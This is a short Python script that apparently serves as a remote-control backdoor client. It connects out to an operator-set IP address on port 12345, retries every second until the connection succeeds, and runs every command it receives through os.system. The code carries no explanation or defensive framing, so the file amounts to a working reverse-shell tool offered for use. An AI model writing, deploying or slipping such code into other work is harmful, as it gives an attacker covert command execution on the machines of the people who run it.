import socket
import threading
import time
import os

def receive(socket, signal):
    while signal:
        try:
            data = socket.recv(32)
            if not data:
                break
            os.system(data.decode('utf-8'))
        except:
            socket.close()
            TryCon()

# Get host and port
host = "1.1.1.1" # set ur ip
port = 12345

def TryCon():
    while True:
        try:
            global sock
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            break
        except:
            print("Server not available. Retrying in 1 second...")
            time.sleep(1)
    StartCon()

def StartCon():
    receiveThread = threading.Thread(target=receive, args=(sock, True))
    receiveThread.start()
    while True:
        pass


TryCon()



